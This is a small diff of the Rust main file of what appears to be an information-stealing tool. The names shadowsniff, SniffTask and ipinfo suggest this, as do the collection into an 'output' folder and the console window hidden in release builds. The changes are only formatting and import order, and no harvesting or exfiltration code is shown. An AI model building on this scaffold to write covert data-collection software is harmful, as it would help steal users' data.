@@ -1,23 +1,14 @@
 #![no_main]
 #![no_std]
-
-#![cfg_attr(
-    debug_assertions,
-    windows_subsystem = "console"
-)]
-
-#![cfg_attr(
-    not(debug_assertions),
-    windows_subsystem = "windows"
-)]
-
+#![cfg_attr(debug_assertions, windows_subsystem = "console")]
+#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
 #![allow(unsafe_op_in_unsafe_fn)]
 
 extern crate alloc;
 
 use alloc::format;
-use collector::atomic::AtomicCollector;
 use collector::DisplayCollector;
+use collector::atomic::AtomicCollector;
 use ipinfo::init_ip_info;
 use shadowsniff::SniffTask;
 use tasks::Task;
@@ -40,13 +31,13 @@ pub fn main(_argc: i32, _argv: *const *const u8) -> i32 {
     let out = Path::new("output");
     let _ = out.remove_dir_all();
     let _ = out.mkdir();
-    
+
     let collector = AtomicCollector::default();
-    
+
     unsafe {
         SniffTask::default().run(&out, &collector);
     }
-    
+
     let displayed_collector = format!("{}", DisplayCollector(collector));
 
     log_debug!("{displayed_collector}");
